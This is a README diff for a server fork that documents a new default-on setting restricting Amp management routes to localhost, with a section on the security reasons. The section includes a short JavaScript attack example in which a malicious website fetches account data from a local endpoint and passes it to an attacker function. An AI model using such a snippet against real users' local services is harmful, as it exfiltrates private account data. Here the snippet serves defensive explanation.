@@ -369,6 +369,7 @@ The server uses a YAML configuration file (`config.yaml`) located in the project
 | `openai-compatibility.*.models.*.alias`            | string   | ""                 | The alias used in the API.                                                                                                                                                                |
 | `amp-upstream-url`                                 | string   | ""                 | **(Fork-specific)** Amp CLI upstream URL for OAuth and management routes. Set to `https://ampcode.com` to enable Amp CLI support.                                                          |
 | `amp-upstream-api-key`                             | string   | ""                 | **(Fork-specific)** Optional API key for Amp upstream. Falls back to `AMP_API_KEY` environment variable, then `~/.local/share/amp/secrets.json`.                                           |
+| `amp-restrict-management-to-localhost`             | bool     | true               | **(Fork-specific)** Restricts Amp management routes to localhost only (127.0.0.1, ::1). Prevents drive-by browser attacks. **Recommended: true**.                                          |
 
 ### Amp CLI Configuration
 
@@ -426,6 +427,47 @@ amp chat "Hello, world!"
 - `/api/internal` - Internal configuration
 - `/api/threads` - Thread management
 - `/api/telemetry` - Telemetry data
+
+#### Security: Localhost Restriction 🔒
+
+**By default, Amp management routes are restricted to localhost access only** to prevent security vulnerabilities.
+
+**Why this matters:**
+- Management routes expose your Amp account data (email, threads, user info)
+- Without protection, malicious websites could exploit CORS to read your data
+- Even with a firewall, browser-based attacks bypass network restrictions
+
+**Configuration:**
+
+```yaml
+# Default: true (recommended - only allow localhost)
+amp-restrict-management-to-localhost: true
+
+# Set to false ONLY in trusted environments (not recommended)
+# amp-restrict-management-to-localhost: false
+```
+
+**When enabled (default):**
+- ✅ Only connections from `127.0.0.1` and `::1` (IPv6 localhost) are accepted
+- ✅ CORS is disabled for management routes (prevents browser attacks)
+- ✅ Remote access attempts receive `403 Forbidden`
+- ✅ Amp CLI works normally (connects from localhost)
+
+**When disabled:**
+- ⚠️ **Security warning logged** at startup
+- ❌ Management routes accessible from any IP
+- ❌ Vulnerable to drive-by browser attacks
+- ❌ Account data can be exfiltrated by malicious websites
+
+**Attack Example (when disabled):**
+```javascript
+// Malicious website can steal your data
+fetch('http://localhost:8317/api/user')
+  .then(r => r.json())
+  .then(data => sendToAttacker(data.email));
+```
+
+**Recommendation:** Keep this feature enabled unless you have a specific need for remote access and understand the security implications.
 
 #### Provider Compatibility
 
